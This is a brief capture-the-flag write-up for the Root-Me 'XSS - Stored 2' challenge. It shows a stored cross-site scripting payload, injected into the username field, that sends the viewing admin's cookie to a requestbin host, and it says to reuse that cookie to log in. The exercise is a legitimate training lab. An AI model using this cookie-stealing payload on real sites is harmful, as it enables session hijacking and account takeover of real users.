## Challenge name: XSS - Stored 2

``` Challenge Link:``` [https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-2](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-2)

**Check the cookie - the website handles access with a `status` cookie with value `invite`.**

**The User info is displayed with a class attribute. Inject XSS payload in the username field:**

**Payload:**
```
"><script>document.write("<img src=https://requestbin.url?cookie=".concat(document.cookie).concat("/>"))</script>
```

**The admin reviews user profiles. Their cookie should be captured. However, quotes or spaces might break the payload. Use `REPLACE` to sanitize if needed.**

**Use the captured ADMIN_COOKIE to authenticate and retrieve the flag/password.**

**Thankyou.**
